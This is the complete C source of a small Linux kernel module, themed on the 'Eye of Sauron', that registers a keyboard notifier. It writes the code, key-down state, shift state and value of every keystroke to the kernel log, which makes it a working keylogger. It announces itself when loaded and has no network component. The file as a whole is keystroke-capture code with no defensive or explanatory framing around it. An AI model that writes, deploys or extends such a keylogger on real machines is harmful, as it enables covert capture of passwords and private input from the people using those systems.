#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>

MODULE_AUTHOR("geno");
MODULE_LICENSE("GPL");

static int start_eye(void);
static void end_eye(void);
static int sauron_notify(struct notifier_block *nb, unsigned long code, void *data);

module_init(start_eye);
module_exit(end_eye);

static struct notifier_block _sauron =
{
    .notifier_call = sauron_notify
};

static int start_eye(void)
{
    register_keyboard_notifier(&_sauron);
    printk("The Eye of Sauron is upon you.\n");

    return 0;
}

static void end_eye(void)
{
    unregister_keyboard_notifier(&_sauron);
    printk("You are free from the Eye.\n");
}

static int sauron_notify(struct notifier_block *nb, unsigned long code, void *raw_data)
{
    struct keyboard_notifier_param *data = raw_data;
    printk("Sauron:\tcode 0x%lx\tdown 0x%x\tshift 0x%x\tvalue 0x%x\n", code, data->down, data->shift, data->value);

    return NOTIFY_OK;
}
